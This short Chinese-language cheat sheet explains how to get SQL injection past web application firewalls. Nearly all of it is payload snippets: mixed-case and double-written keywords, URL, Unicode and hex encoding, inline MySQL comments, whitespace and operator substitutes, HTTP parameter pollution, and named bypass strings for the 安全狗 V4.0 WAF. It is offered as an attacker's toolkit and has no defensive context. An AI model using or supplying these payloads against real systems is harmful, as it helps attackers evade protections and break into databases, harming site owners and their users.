# SQL注入—WAF绕过

# SQL注入—WAF绕过

### `WAF拦截原理：WAF从规则库中匹配敏感字符进行拦截。`

![image.png](https://pic.imgdb.cn/item/64c5f2481ddac507cc26529e.jpg)

## 关键词大小写绕过

有的WAF因为规则设计的问题，只匹配纯大写或纯小写的字符，对字符大小写混写直接无视，这时，我们可以利用一点来进行绕过

```sql
union select ---> unIOn SeLEcT
```

## 编码绕过

针对WAF过滤的字符编码，如使用URL编码，Unicode编码，十六进制编码，Hex编码等

```sql
union select 1,2,3# ---> union%0aselect 1\u002c2,3%23
```

## 双写绕过

部分WAF只对字符串识别一次，删除敏感字段并拼接剩余语句，可以通过双写来进行绕过

```sql
UNIunionON

SELselectECT

anandd
```

## 换行(\N)绕过

```sql
select * from admin where username = \N union select 1,user() from admin
```

## 注释符内联注释绕过：

```sql
union selecte ---> /*!union*/ select
```

## 同义词替换

```
and ---> &&

or ---> ||

=(等于号)=<、>

空格 ---> %09、%0a、%0b、%0c、%0d、%20、%a0等

# %0a是换行，也可以替代空格
```

## HTTP参污染

对目标发送多个参数，如果目标没有多参数进行多次过滤，那么WAF对多个参数只会识别其中的一个

```sql
?id=1&id=2&id=3

?id=1/**&id=-1%20union%20select%201,2,3%23*/
```

## 安全狗 V4.0绕过

```sql
order by绕过：	%20/*//--/*/  

联合绕过：		union /*!--+/*%0aselect/*!1,2,3*/ --+

from绕过： 	/*!06447%23%0afrom*/
```
